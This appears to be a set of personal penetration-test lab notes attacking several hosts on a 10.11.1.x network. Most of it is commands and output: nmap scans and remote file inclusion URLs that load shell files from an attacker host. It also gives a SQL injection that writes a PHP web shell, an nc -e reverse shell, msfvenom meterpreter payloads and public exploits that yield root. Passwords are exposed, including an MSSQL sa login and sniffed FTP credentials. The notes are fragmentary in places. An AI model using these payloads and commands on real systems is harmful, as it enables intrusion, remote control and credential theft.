### 10.11.1.8

#### information

Not shown: 990 filtered ports
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 2.0.1
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.11.0.104
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 2.0.1 - secure, fast, stable
|_End of status
22/tcp   open   ssh         OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey:
|   1024 89:94:af:2e:5d:c1:da:84:25:11:2c:12:45:c6:70:ac (RSA1)
|   1024 c1:c5:d1:83:0f:4d:d8:9e:8f:82:4c:be:53:4b:6e:14 (DSA)
|_  1024 bc:e1:e6:dd:ab:5e:fd:d1:21:2e:11:7c:d5:b2:03:52 (RSA)
|_sshv1: Server supports SSHv1
25/tcp   closed smtp
80/tcp   open   http        Apache httpd 2.0.52 ((CentOS))
| http-methods:
|_  Potentially risky methods: TRACE
| http-robots.txt: 2 disallowed entries
|_/internal/  /tmp/
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open   rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            844/udp  status
|_  100024  1            847/tcp  status
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
443/tcp  open   ssl/https?
|_ssl-date: 2019-03-01T08:39:29+00:00; -11s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
445/tcp  open   netbios-ssn Samba smbd 3.0.33-0.17.el4 (workgroup: MYGROUP)
631/tcp  open   ipp         CUPS 1.1
| http-methods:
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
3306/tcp open   mysql?
|_mysql-info: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:50:56:89:24:79 (VMware)
Service Info: OS: Unix

Host script results:
|_clock-skew: mean: 1h39m49s, deviation: 2h53m12s, median: -11s
| smb-os-discovery:
|   OS: Unix (Samba 3.0.33-0.17.el4)
|   Computer name: phoenix
|   NetBIOS computer name:
|   Domain name:
|   FQDN: phoenix
|_  System time: 2019-03-01T03:39:28-05:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

###  exploit

https://www.exploit-db.com/exploits/9623

#### poc

http://10.11.1.8/internal/advanced_comment_system/index.php?ACS_path=http://10.11.0.104/shell.txt%00&cmd=cat /etc/passwd

```shell
<pre>root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nolo
```







### 10.11.1.13

####  information

#### exploit

ftp allow anonymous user to upload file in wwwroot path

ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection for /bin/ls.
01-17-07  06:42PM       <DIR>          AdminScripts
01-17-07  06:43PM       <DIR>          ftproot
01-17-07  06:43PM       <DIR>          iissamples
01-17-07  06:43PM       <DIR>          Scripts
03-13-19  11:46AM       <DIR>          wwwroot

#### poc

msfveon -p windows/meterpreter/reverse_tcp  lhost=ip lport=port  -f asp -o sh.asp

### 10.11.1.22

Nmap scan report for 10.11.1.22
Host is up (0.29s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp?
22/tcp    open  ssh         OpenSSH 3.1p1 (protocol 1.99)
| ssh-hostkey:
|   1024 4a:e3:f8:07:d5:d6:b1:b5:bf:54:ac:e7:17:36:7e:e8 (RSA1)
|   1024 77:67:f2:2c:3d:7c:45:24:fe:5e:0f:de:07:65:b3:57 (DSA)
|_  1024 42:b1:48:0b:41:f8:a9:12:cc:9b:c4:ed:26:74:64:2c (RSA)
|_sshv1: Server supports SSHv1
23/tcp    open  telnet?
25/tcp    open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
80/tcp    open  http        Apache httpd 1.3.23 ((Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2)
| http-methods:
|_  Potentially risky methods: PUT DELETE CONNECT PATCH PROPFIND PROPPATCH MKCOL COPY MOVE LOCK UNLOCK TRACE
|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1          32768/tcp  status
|_  100024  1          32768/udp  status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
199/tcp   open  smux        Linux SNMP multiplexer
443/tcp   open  ssl/https   Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.
|_http-server-header: Apache/1.3.23 (Unix)  (Red-Hat/Linux) mod_python/2.7.6 Python/1.5.2 mod_ssl/2.8.7 OpenSSL/0.9.6b DAV/1.0.3 PHP/4.1.2 mod_perl/1.26 mod_throttle/3.1.2
|_http-title: 400 Bad Request
|_ssl-date: 2019-03-13T13:30:48+00:00; -2s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
995/tcp   open  ssl/pop3s?
|_ssl-date: 2019-03-13T13:30:47+00:00; -3s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
32768/tcp open  status      1 (RPC #100024)
MAC Address: 00:50:56:89:2E:AA (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

#### exploit

https://medium.com/@javarmutt/how-to-compile-openfuckv2-c-69e457b4a1d1

poc

https://www.exploit-db.com/raw/764

./openfuck 0x73 10.11.1.22 -c 40

we knew that some port open when we used the nmap scan,

 so we try to get the version about samba.

cat  /var/log/rpmpkgs | grep samba

samba-2.2.3a-6.i386.rpm
samba-client-2.2.3a-6.i386.rpm
samba-common-2.2.3a-6.i386.rpm

this is article : https://yanhan.github.io/netsec-blog/posts/kioptrix-level-1-walkthrough.html

Boom!

perl trans2root.pl   -t  linx86 -H 10.11.0.104 -h 10.11.1.22

we get the root shell

#### 10.11.1.24

csid=a8b144e2690690581ea858648a710cea*; cart_languageC=EN; secondary_currencyC=usd



#### 10.11.1.31

#### information

80/tcp   open  http          Microsoft IIS httpd 6.0
| http-cookie-flags:
|   /:
|     ASPSESSIONIDSCDQASQB:
|_      httponly flag not set
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Login
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2003 3790 Service Pack 1 microsoft-ds
1025/tcp open  msrpc         Microsoft Windows RPC
1033/tcp open  msrpc         Microsoft Windows RPC
1433/tcp open  ms-sql-s      Microsoft SQL Server 2000 8.00.766.00; SP3a
| ms-sql-ntlm-info:
|_  Product_Version: 5.2.3790
3389/tcp open  ms-wbt-server Microsoft Terminal Service
MAC Address: 00:50:56:89:1E:41 (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2003

Host script results:
|_clock-skew: mean: 2h59m57s, deviation: 4h14m34s, median: -3s
| ms-sql-info:
|   Windows server name: RALPH
|   10.11.1.31\MSSQLSERVER:
|     Instance name: MSSQLSERVER
|     Version:
|       name: Microsoft SQL Server 2000 SP3a
|       number: 8.00.766.00
|       Product: Microsoft SQL Server 2000
|       Service pack level: SP3a
|       Post-SP patches applied: false
|     TCP port: 1433
|     Named pipe: \\10.11.1.31\pipe\sql\query
|_    Clustered: false
|_nbstat: NetBIOS name: RALPH, NetBIOS user: USER65, NetBIOS MAC: 00:50:56:89:1e:41 (VMware)
| smb-os-discovery:
|   OS: Windows Server 2003 3790 Service Pack 1 (Windows Server 2003 5.2)
|   OS CPE: cpe:/o:microsoft:windows_server_2003::sp1
|   Computer name: ralph
|   NetBIOS computer name: RALPH\x00
|   Workgroup: THINC\x00
|_  System time: 2019-03-14T21:05:44-06:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

#### recon

port smb, mssql , web

smb

smbmap -u anonymous -H 10.11.1.31 -R  -A  base-login.txt
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.11.1.31...
[+] IP: 10.11.1.31:445  Name: 10.11.1.31
        Disk                                                    Permissions

----                                                    -----------
​        C$                                                      NO ACCESS
​        IPC$                                                    NO ACCESS
​        ADMIN$                                                  NO ACCESS
​        [+] Match found! Downloading: wwwroot\.\base-login.txt

read the   login-off.asp.txt  by http://10.11.1.31/login-off.asp.txt

cnn.open "PROVIDER=SQLOLEDB;DATA SOURCE=RALPH;User ID=sa;PWD=poiuytrewq;DATABASE=bankdb"

this have the mssql login info

#### sqsh

sqsh -S 10.11.1.31 -U sa 

passwd : poiuytrewq



 xp_cmdshell 'cmd /c dir c:\DOCUME~1\Administrator\desktop\proof.txt';

go

BOOM!



### 10.11.1.24

#### information



#### recon

GET /index.php?target=products&mode=search&subcats=Y&type=extended&avail=Y&pshort=Y&pfull=Y&pname=Y&q=asdf&cid=0&x=0&y=0 HTTP/1.1
Host: 10.11.1.24
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.11.1.24/
Cookie: csid=a8b144e2690690581ea858648a710cea*; cart_languageC=EN; secondary_currencyC=usd

csid have the sql injection, https://seclists.org/pen-test/2007/Dec/75

**Writing a phpshell via SQL Injection to a host**

csid=a8b144e2690690581ea858648a710cea'+union+select+"<%3fphp+echo+shell_exec($_REQUEST['cmd'])%3b%3f>+"+into+outfile+"/var/www/ell2.php"+/*++--+-; cart_languageC=EN

view-source:http://10.11.1.24/ell2.php?cmd=ls

```php
Thumbs.db
addons
admin.php
apache2-default
catalog
chart.php
classes
config.php
core
ell.php
ell.txt
ell2.php
image.php
images
include
index.php
init.php
install.php
install_db
payments
prepare.php
shell.php
shippings
skins
store_closed.gif
store_closed.html
targets
var
```

Boom!

#### reverse shell

nc -e /bin/sh 10.11.0.104 9000

#### enum the system

 msfvenom -p linux/x86/meterpreter_reverse_tcp lhost=10.11.0.104 lport=8000 -f elf -o check

msf5 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.11.1.24 - Collecting local exploits for x86/linux...
[*] 10.11.1.24 - 25 exploit checks are being tried...
[+] 10.11.1.24 - exploit/linux/local/glibc_ld_audit_dso_loadP

[+] 10.11.1.24 - exploit/linux/local/glibc_origin_expansion_priv_esc: The target appears to be vulnerable.
[+] 10.11.1.24 - exploit/linux/local/sock_sendpage: The target appears to be vulnerable.
[*] Post module execution completed



msf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > set lhost 10.11.0.104
lhost => 10.11.0.104
msf5 exploit(linux/local/glibc_ld_audit_dso_load_priv_esc) > run

[*] Started reverse TCP handler on 10.11.0.104:4444
[+] The target appears to be vulnerable
[*] Using target: Linux x86
[*] Writing '/tmp/.QCt1Q64' (1271 bytes) ...
[*] Writing '/tmp/.BU8n4' (281 bytes) ...
[*] Writing '/tmp/.wiUsPR47P' (207 bytes) ...
[*] Launching exploit...
[*] Sending stage (985320 bytes) to 10.11.1.24
[*] Meterpreter session 2 opened (10.11.0.104:4444 -> 10.11.1.24:46457) at 2019-03-15 15:22:22 +0800

meterpreter > sessions -i 2
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > sessions  -i 2
Usage: sessions <id>

Interact with a different session Id.
This works the same as calling this from the MSF shell: sessions -i <session id>

meterpreter > getuid
Server username: uid=0, gid=0, euid=0, egid=

Boom!

[*] Downloading: /root/capture.cap -> capture.cap
[*] Downloaded 2.24 KiB of 2.24 KiB (100.0%): /root/capture.cap -> capture.cap
[*] download   : /root/capture.cap -> capture.cap

we wanna see the capture.cap, this is something interersting

220-FileZilla Server version 0.9.34 beta

220-written by Tim Kosse (Tim.Kosse@gmx.de)

220 Please visit http://sourceforge.net/projects/filezilla/

10.11.1.220

USER brett

331 Password required for brett

PASS ilovesecuritytoo

230 Logged on

SYST

215 UNIX emulated by FileZilla

QUIT

221 Goodbye

####  10.11.1.31

sory I Forgot this how to get shell



#### 10.11.1.35

#### information

#### recon

this is a LFI https://10.11.1.35/section.php?page=/etc/passwd%00 and RFI 

#### poc

https://10.11.1.35/section.php?page=http://10.11.0.104/cmd.txt%00&cmd=ls

'''

```
alldocs.php
bobdocs.php
files
frame_a.htm
frame_b.htm
frame_c.htm
index.html
section.php
```

'''

 